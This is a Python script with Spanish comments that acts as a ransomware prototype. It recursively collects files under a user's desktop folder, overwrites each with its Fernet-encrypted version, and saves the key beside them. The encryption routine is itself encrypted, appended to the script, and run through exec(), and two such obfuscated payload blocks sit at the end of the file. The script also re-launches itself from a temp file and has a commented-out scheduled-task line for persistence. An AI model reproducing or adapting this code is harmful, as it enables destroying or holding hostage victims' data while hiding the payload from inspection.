#!/usr/bin/env python3
import os
import time
import tempfile
from cryptography.fernet import Fernet
import subprocess
import signal
from termcolor import colored
import allfiles1
import sys

# Crl C
def def_handler(sig, frame):
    print(colored (f"\n[!] Saliendo...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def tmp_task():
    #os.system(f'schtasks /create /tn "MyTask" /tr "python {script_path}" /sc onstart')
    if "executed_twice" not in os.environ:
        print("Creando archivo temporal para la segunda ejecución...")

        # Crear archivo temporal en la carpeta del sistema
        temp_dir = tempfile.gettempdir()
        temp_script_path = os.path.join(temp_dir, "temp_script.py")

        # Escribir un nuevo script Python en el archivo temporal
        with open(temp_script_path, 'w', encoding='utf-8') as temp_script:
            temp_script.write(
                "import subprocess\n"
                "import os\n\n"
                "# Código que se ejecutará desde el archivo temporal\n"
                "print('Ejecutando desde el archivo temporal.')\n\n"
                "# Ejecutar nuevamente el script original\n"
                f"subprocess.run(['python', '{sys.argv[0]}'])\n"
                "print(f'{sys.argv[0]}')"
            )

        print(f"Archivo temporal creado: {temp_script_path}")

        # Establecer una variable de entorno para evitar bucles infinitos
        os.environ["executed_twice"] = "1"

        # Ejecutar el script desde el archivo temporal
        subprocess.run([sys.executable, temp_script_path])

    else:
        print("Segunda ejecución completada desde el archivo temporal.")

def c_e(code, key):
    fernet = Fernet(key)
    encrypted_code = fernet.encrypt(code.encode())
    return encrypted_code


def d_e(encrypted_code, key):
    fernet = Fernet(key)
    decrypted_code = fernet.decrypt(encrypted_code).decode()
    return decrypted_code



def gen_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)



def return_key():
    return open('key.key', 'rb').read()



def file_encrypt(files, key):
    fernet = Fernet(key)
    for filepath in files:
        with open(filepath, "rb") as file:
            data_to_encrypt = file.read()
        data = fernet.encrypt(data_to_encrypt)

        # Guardar el archivo cifrado
        with open(filepath, "wb") as file:
            file.write(data)

def self_modifying_code(keycode):
    new_code = """
encrypted_code = b'{encrypted_code}'
exec(d_e(encrypted_code, b'{key}'))
"""

    code_to_add = r'''
def file_encrypt(files, key):
    fernet = Fernet(key)
    for filepath in files:  
        with open(filepath, "rb") as file:  
            data_to_encrypt = file.read()
        data = fernet.encrypt(data_to_encrypt)

        with open(filepath, "wb") as file:  
            file.write(data)


base_directory = r"C:\Users\Lenovo\OneDrive\Desktop\encrypt"
allfiles1.searching_files(base_directory)
files = allfiles1.file_list

gen_key()
key = return_key()
file_encrypt(files, key)
time.sleep(5)
subprocess.run(["python3", "interface.py"])
'''

    encrypted_code = c_e(code_to_add, keycode).decode()
    formatted_code = new_code.format(encrypted_code=encrypted_code, key=keycode.decode())

    current_file = __file__
    with open(current_file, 'a') as f:
        f.write(formatted_code)

def main():
    keycode = Fernet.generate_key()
    script_path = os.path.abspath(__file__)
    self_modifying_code(keycode)
    #subprocess.run(["python3", "ads_file.py", "texto3.txt", "-a", "art.py"])
    #time.sleep(10)
    #tmp_task()


if __name__ == '__main__':
    main()
    tmp_task()
    #subprocess.run(["python3", "interface.py"])




encrypted_code = b'gAAAAABnDMPY1n3RnQdviIQgteYo9bchrCCRMnaWlVx9MSJm3j8Ml_xXtjcA7AfnwSNX602PbOf2-8J46BxaFQHfuyVrLjKK4d8ahQdlQf9g1cx9aej3EPpC1GwFQACm6IqzLRo9W1J8P9ihs0r1PMFlbYvddkdkFJrAboY0wbYSMalQ_imbb2p55xXejKEOxUUZ9xoH4kSbmGqw4bQ8RlTGb4axJumm3SfzMaLsuaEGP2FhJ4qKn1caHUrMiHtQLtO3WhbpHOFVv1F-2WkMKu3RUt-bxNuj96MvXtDcl3wyk9dIRc5sxevOi9J9bYzUa5Gm4IvuW1Q7sTD8-h0afrwT2Ykm1fxGFURHhh7jj85TzgcJP-DQpRJwt7EJU2aScs4cW6TiZpEqUhQ7lh6t5abAlLZdvFHm-zJd454k9cPdMfjLeXbBtbaNU_STT6oWdCzWogdTQoew_an4wXskb67Qfec2fZyGuP9VNEXD12IHgMFRlmg3IkKY3mceF2eZ45_1X377SLHJ6EbAh3xK6ZHcTr67N2gFMNfXA_wXN0OkCaIF0H1M1cPh39RO1jxyWrxHroWiVCciylXOSU8F-MDHsphZ5Th3aTqb5nmJyHWEGAbbRQV-gJsJPcX4zCx03CI8XYZpkn29YtXLo1NP_Jt7rjHsb_D3WUAwvx-j9tbR3gbWviyfZJNRUR1G_8w5J3q1tbYiMiRKy5QSs5YDlJZ9lHp-wYk3OJLr315oDveb1NnhnpSqSN-kvJy5wts6bF1vWUlerx_YlyDO-8YM2lbM9n3h14otsQ=='
exec(d_e(encrypted_code, b'1PTtOWafKM5G0lKwNaKZ_U0-hRHClRaeZuYyVVYzO_Y='))

encrypted_code = b'gAAAAABnDMPZ32aOcbHUMP6f3Z6REEprR7nQmWNZL0QM0P0AO1mem4nvm7b_85J5t2IZUzpnwwvx7zzKQ-7LCsCDy8gIBvAjxI10UNxEoZoF0rV5YfG6MDmwZbN9mhUn2e5rS3B0HDEK-ReYarGj-NDq-HesTPOjzrdCzyJPFNKgWBcFmZfAhMgSDIsHli0ubmr9AV0z9PVeD7e4R1F9uf5GuKAhD6HzpTvUFTCTBzMjN733Ct5arHykZvDAZgxvowS-PY6mMp-oftFgpefXx1f0EfpFVlSTbrLGkvgSN57WaCBNEBXmfwT1f1lvzxdGyaMNg_dDualBMQPeNUOwxDCB64wykeHc7mUN-3FYwuMgWaSHQ-KSDMNjw2sQH5GXDr30bQfaJiOeSGYQvJeD71hBDG9t4iUDScWAA_XeZKYkvkNehuyq_bs7uxbkk1ln9riJ6bo3q6gae1kMk6jOxEFKlHvpgTkk6z016jJ11GWKGdsb5hij-eLq1bzNJFSzQqUg8s5aAqzACO35ef5aSvCN7OKVQZfHmjoKbNSsUKjxB0w21cP5SGZ0yhgqltpqPwIPs1Edj55Lmsn1ggKndsMDezrQFiy9wBHdsvDX1O3bmI3RcvfhQM16XODFtOUOGN_nE7rA574BlgjHQwsiY_An6PxkS_I3sSwA2SdFV0e_DTUhTi16RYchu_Un_ZZtqMSb91fJvj4zI34K3VAGCdEF_YorcaFHnodOGtxiOhtyXovP3sS1F2dCMWguofQbVOrctfFyyuyfQSmoObZpjA5DppypaHO_3A=='
exec(d_e(encrypted_code, b'SE5HeGN7Ya7HANUSraqr487PN2SaGs9VKQSRvo6Tpv8='))
